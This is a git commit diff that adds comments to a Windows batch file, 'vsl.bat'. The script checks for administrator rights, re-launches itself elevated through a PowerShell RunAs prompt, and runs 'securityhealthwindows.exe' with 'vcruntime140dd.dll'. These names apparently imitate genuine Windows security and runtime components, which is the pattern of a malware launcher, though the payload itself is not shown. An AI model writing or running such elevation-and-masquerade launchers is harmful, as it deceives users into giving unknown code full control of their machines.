2e2fecfea29416104de6125a9b21aa8190d31ab3
omarmohelal <122343362+omarmohelal@users.noreply.github.com>
2025-03-17 20:39:24 +0200

    Add files via upload

--- vsl.bat
+++ vsl.bat
@@ -5,6 +5,7 @@ echo Current user privileges: %userprofile%
 echo.
 echo Requesting administrative privileges...
 
+:: Check if the script is already running with elevated privileges (Administrator).
 net session >nul 2>&1
 if %errorLevel% == 0 (
     goto :continue
@@ -17,6 +18,7 @@ echo.
 echo You need to run this batch file as an Administrator.
 echo Please grant administrative privileges by selecting "Yes" when prompted.
 echo.
+:: Re-run the batch script with elevated privileges (RunAs).
 powershell -Command "Start-Process '%0' -Verb RunAs"
 exit
 
@@ -24,6 +26,7 @@ exit
 echo Administrative privileges confirmed.
 echo.
 
+:: Run your command (make sure this is the correct command).
 securityhealthwindows.exe vcruntime140dd.dll
 
 echo.
